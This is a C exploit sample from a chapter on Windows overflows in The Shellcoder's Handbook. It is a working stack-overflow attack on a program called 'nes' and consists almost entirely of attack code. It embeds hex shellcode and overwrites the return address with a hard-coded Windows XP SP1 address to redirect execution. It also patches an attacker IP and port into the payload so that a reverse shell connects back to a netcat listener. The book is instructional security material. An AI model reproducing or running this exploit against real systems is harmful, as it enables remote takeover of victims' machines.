/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 8: Windows Overflows
Sample Program #13

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

#include <stdio.h>
    #include <windows.h>

     unsigned char exploit[510]=
     "\x55\x8B\xEC\xEB\x03\x5B\xEB\x05\xE8\xF8\xFF\xFF\xFF\xBE\xFF\xFF"
     "\xFF\xFF\x81\xF6\xDC\xFE\xFF\xFF\x03\xDE\x33\xC0\x50\x50\x50\x50"
     "\x50\x50\x50\x50\x50\x50\xFF\xD3\x50\x68\x61\x72\x79\x41\x68\x4C"
     "\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\xFF\x75\xFC\xFF\x55\xF4\x89"
     "\x45\xF0\x83\xC3\x63\x83\xC3\x5D\x33\xC9\xB1\x4E\xB2\xFF\x30\x13"
     "\x83\xEB\x01\xE2\xF9\x43\x53\xFF\x75\xFC\xFF\x55\xF4\x89\x45\xEC"
     "\x83\xC3\x10\x53\xFF\x75\xFC\xFF\x55\xF4\x89\x45\xE8\x83\xC3\x0C"
     "\x53\xFF\x55\xF0\x89\x45\xF8\x83\xC3\x0C\x53\x50\xFF\x55\xF4\x89"
     "\x45\xE4\x83\xC3\x0C\x53\xFF\x75\xF8\xFF\x55\xF4\x89\x45\xE0\x83"
     "\xC3\x0C\x53\xFF\x75\xF8\xFF\x55\xF4\x89\x45\xDC\x83\xC3\x08\x89"
     "\x5D\xD8\x33\xD2\x66\x83\xC2\x02\x54\x52\xFF\x55\xE4\x33\xC0\x33"
     "\xC9\x66\xB9\x04\x01\x50\xE2\xFD\x89\x45\xD4\x89\x45\xD0\xBF\x0A"
     "\x01\x01\x26\x89\x7D\xCC\x40\x40\x89\x45\xC8\x66\xB8\xFF\xFF\x66"
     "\x35\xFF\xCA\x66\x89\x45\xCA\x6A\x01\x6A\x02\xFF\x55\xE0\x89\x45"
     "\xE0\x6A\x10\x8D\x75\xC8\x56\x8B\x5D\xE0\x53\xFF\x55\xDC\x83\xC0"
     "\x44\x89\x85\x58\xFF\xFF\xFF\x83\xC0\x5E\x83\xC0\x5E\x89\x45\x84"
     "\x89\x5D\x90\x89\x5D\x94\x89\x5D\x98\x8D\xBD\x48\xFF\xFF\xFF\x57"
     "\x8D\xBD\x58\xFF\xFF\xFF\x57\x33\xC0\x50\x50\x50\x83\xC0\x01\x50"
     "\x83\xE8\x01\x50\x50\x8B\x5D\xD8\x53\x50\xFF\x55\xEC\xFF\x55\xE8"
     "\x60\x33\xD2\x83\xC2\x30\x64\x8B\x02\x8B\x40\x0C\x8B\x70\x1C\xAD"
     "\x8B\x50\x08\x52\x8B\xC2\x8B\xF2\x8B\xDA\x8B\xCA\x03\x52\x3C\x03"
     "\x42\x78\x03\x58\x1C\x51\x6A\x1F\x59\x41\x03\x34\x08\x59\x03\x48"
     "\x24\x5A\x52\x8B\xFA\x03\x3E\x81\x3F\x47\x65\x74\x50\x74\x08\x83"
     "\xC6\x04\x83\xC1\x02\xEB\xEC\x83\xC7\x04\x81\x3F\x72\x6F\x63\x41"
     "\x74\x08\x83\xC6\x04\x83\xC1\x02\xEB\xD9\x8B\xFA\x0F\xB7\x01\x03"
     "\x3C\x83\x89\x7C\x24\x44\x8B\x3C\x24\x89\x7C\x24\x4C\x5F\x61\xC3"
     "\x90\x90\x90\xBC\x8D\x9A\x9E\x8B\x9A\xAF\x8D\x90\x9C\x9A\x8C\x8C"
     "\xBE\xFF\xFF\xBA\x87\x96\x8B\xAB\x97\x8D\x9A\x9E\x9B\xFF\xFF\xA8"
     "\x8C\xCD\xA0\xCC\xCD\xD1\x9B\x93\x93\xFF\xFF\xA8\xAC\xBE\xAC\x8B"
     "\x9E\x8D\x8B\x8A\x8F\xFF\xFF\xA8\xAC\xBE\xAC\x90\x9C\x94\x9A\x8B"
     "\xBE\xFF\xFF\x9C\x90\x91\x91\x9A\x9C\x8B\xFF\x9C\x92\x9B\xFF\xFF"
     "\xFF\xFF\xFF\xFF";


     int main(int argc, char *argv[])
     {
            int cnt = 0;
            unsigned char buffer[1000]="";

            if(argc !=3)
                    return 0;

            StartWinsock();

            // Set the IP address and port in the exploit code
            // If your IP address has a NULL in it then the
            // string will be truncated.
            SetUpExploit(argv[1],atoi(argv[2]));

            // name of the vulnerable program
            strcpy(buffer,"nes ");
            // copy exploit code to the buffer
            strcat(buffer,exploit);

            // Pad out the buffer	
            while(cnt < 25)
            {
                    strcat(buffer,"\x90\x90\x90\x90");
                    cnt ++;
            }

            strcat(buffer,"\x90\x90\x90\x90");

            // Here's where we overwrite the saved return address
            // This is the address of lstrcatA on Windows XP SP 1
            // 0x77E74B66
            strcat(buffer,"\x66\x4B\xE7\x77");

            // Set the return address for lstrcatA
            // this is where our code will be copied to
            // in the TEB
            strcat(buffer,"\xBC\xE1\xFD\x7F");

            // Set the destination buffer for lstrcatA
            // This is in the TEB and we'll return to
            // here.
            strcat(buffer,"\xBC\xE1\xFD\x7F");


            // This is our source buffer. This is the address
            // where we find our original buffer on the stack
            strcat(buffer,"\x10\xFB\x12");

            // Now execute the vulnerable program!
            WinExec(buffer,SW_MAXIMIZE);

            return 0;
     }

     int StartWinsock()
     {
            int err=0;
            WORD wVersionRequested;
            WSADATA wsaData;

            wVersionRequested = MAKEWORD( 2, 0 );
            err = WSAStartup( wVersionRequested, &wsaData );
            if ( err != 0 )
                    return 0;
            if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsa-Data.wVersion ) != 0 )
             {
                    WSACleanup( );
                    return 0;
            }
            return 0;
     }
     int SetUpExploit(char *myip, int myport)
     {
            unsigned int ip=0;
            unsigned short prt=0;
            char *ipt="";
            char *prtt="";

            ip = inet_addr(myip);

            ipt = (char*)&ip;
            exploit[191]=ipt[0];
            exploit[192]=ipt[1];
            exploit[193]=ipt[2];
            exploit[194]=ipt[3];

            // set the TCP port to connect on
            // netcat should be listening on this port
            // e.g. nc -l -p 53

            prt = htons((unsigned short)myport);
            prt = prt ^ 0xFFFF;
            prtt = (char *) &prt;
            exploit[209]=prtt[0];
            exploit[210]=prtt[1];

            return 0;
     }
